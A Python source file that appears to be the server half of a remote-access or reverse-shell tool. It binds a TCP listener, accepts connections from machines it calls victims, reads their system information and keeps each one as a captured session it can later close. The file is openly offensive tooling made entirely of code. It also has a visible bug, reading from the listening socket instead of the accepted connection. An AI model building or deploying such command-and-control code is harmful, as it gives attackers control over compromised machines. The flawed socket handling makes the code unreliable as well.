import threading
import requests
import socket
import random
import Sessions

def GetNetworkIP():
    try:
        # Create a dummy socket connection to get the IP address
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            # Connect to Google DNS and fetch the first IP
            # encapsulated within the IP Packet
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception as e:
        print(f"Error: {e}")
        return None

def GetPublicIP():
    answer = str(input("Are you Comfortable Sending a Request to `https://ipinfo.io/ip`? [y/N] >> "))
    if 'y' in answer.lower() or 'yes' in answer.lower():
        try:
            response = requests.get("https://ipinfo.io/ip")
            response.raise_for_status()
            return response.text.strip()
        except requests.RequestException as e:
            print(f"Error fetching public IP: {e}")
            return None
    else:
        return None
    
def GetIP(ipType:str):
    if ipType == "local":
        print("Getting LAN IP. . .")
        return GetNetworkIP()
    elif ipType == "public":
        print("Getting Public IP. . .")
        return GetPublicIP()
    else:
        print(f"[-] Unknown type: {ipType}")
        return ipType

class ServerConfig:
    def __init__(self, lhost:str, lport:int):
        self.lhost = lhost
        self.lport = lport
        self.capturedSessions = []
        self.sessionThreads = []
        self.isActive = True

    def GetLhost(self):
        return self.lhost
    def GetLport(self):
        return self.lport

    def Active(self):
        return self.isActive
    def ReadyShutdown(self):
        print("[*] Sending Shutdown Signal. . .")
        self.isActive = False
        try:
            killSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            killSocket.connect((self.lhost, self.lport))
        except:
            return None
    
    def GetSessions(self):
        return self.capturedSessions
    def AddSession(self, session):
        self.capturedSessions.append(session)
    def RemoveSession(self, session):
        self.capturedSessions.remove(session)

    def AddSessionThread(self, t):
        self.sessionThreads.append(t)

    def KillSessions(self):
        print("[*] Closing Active Sessions. . .")
        for sess in self.capturedSessions:
            sess.EndSession()

        for t in self.sessionThreads:
            t.join()
        print("[+] Sessions Closed Successfully!")
    
def RunServer(MalServer):
    try:
        id = 0

        print(f"[*] Attempting to Bind to >> {MalServer.GetLhost()}:{MalServer.GetLport()}")

        serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        serversocket.bind((MalServer.GetLhost(), MalServer.GetLport()))
        serversocket.listen()

        print(f"[+] Server Active | {MalServer.GetLhost()}:{MalServer.GetLport()}")

        while MalServer.Active():
            connection, address = serversocket.accept()
            # Upon connection if the server has been shutdown we skip all connection logic
            # concerning Clients
            if MalServer.Active() == False:
                break

            # Server recieves victim system information
            sessionData = serversocket.recv(1024).decode()

            # Store new Session Connection
            clientSession = Sessions.Session(connection,address,sessionData)
            MalServer.AddSession(clientSession)

        # Shutdown the Socket Server
        MalServer.KillSessions()
        serversocket.close()

        print("[*] Server Session Ended!")
    except Exception as e:
        print(f"Error: {e}")